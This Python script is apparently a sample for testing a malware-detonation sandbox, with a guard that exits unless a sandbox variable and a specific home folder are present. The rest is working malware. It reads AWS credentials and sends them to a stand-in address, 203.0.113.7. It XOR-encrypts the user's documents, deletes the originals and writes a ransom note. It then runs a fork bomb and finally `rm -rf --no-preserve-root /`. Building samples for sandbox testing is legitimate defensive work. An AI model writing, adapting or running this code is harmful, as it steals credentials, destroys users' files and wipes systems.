# Demo sample for Detonation Ocean. Refuses to run outside the sandbox.
import errno
import os
import secrets
import signal
import socket
import subprocess
import sys
import time

if os.environ.get("DETONATION_SANDBOX") != "1" or not os.path.isdir("/home/dana/Documents"):
    sys.exit(0)

home = os.path.expanduser("~")
documents = os.path.join(home, "Documents")
desktop = os.path.join(home, "Desktop")
exfil_address = ("203.0.113.7", 443)

with open(os.path.join(home, ".aws", "credentials"), "rb") as handle:
    credentials = handle.read()

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.settimeout(5)
try:
    sock.connect(exfil_address)
except OSError:
    pass
try:
    sock.sendall(credentials)
except OSError:
    pass
sock.close()

key = secrets.token_bytes(32)
for name in os.listdir(documents):
    path = os.path.join(documents, name)
    if not os.path.isfile(path) or name.endswith(".locked"):
        continue
    with open(path, "rb") as handle:
        data = handle.read()
    with open(path + ".locked", "wb") as handle:
        handle.write(bytes(byte ^ key[index % len(key)] for index, byte in enumerate(data)))
    os.remove(path)

with open(os.path.join(desktop, "README-RESTORE.txt"), "w", encoding="utf-8") as handle:
    handle.write(
        "YOUR DOCUMENTS ARE LOCKED (DEMO)\n"
        "\n"
        "This is a fictional ransom note written by a demo sample.\n"
        "No payment is required and no real files were harmed.\n"
    )

# Fork bomb with lean children: each child becomes `sleep 20` at once, so the process cap is reached before the memory cap.
# The parent keeps trying (at most 2000 attempts, for at most 10 s) and counts the refusals instead of stopping at the first.
children = []
refused = 0
deadline = time.monotonic() + 10
for _ in range(2000):
    if time.monotonic() > deadline:
        break
    try:
        pid = os.fork()
    except OSError as error:
        if error.errno not in (errno.EAGAIN, errno.ENOMEM):
            break
        refused += 1
        continue
    if pid == 0:
        os.execv("/bin/sleep", ["sleep", "20"])
    children.append(pid)
for pid in children:
    os.kill(pid, signal.SIGKILL)
    os.waitpid(pid, 0)

subprocess.run(["rm", "-rf", "--no-preserve-root", "/"])
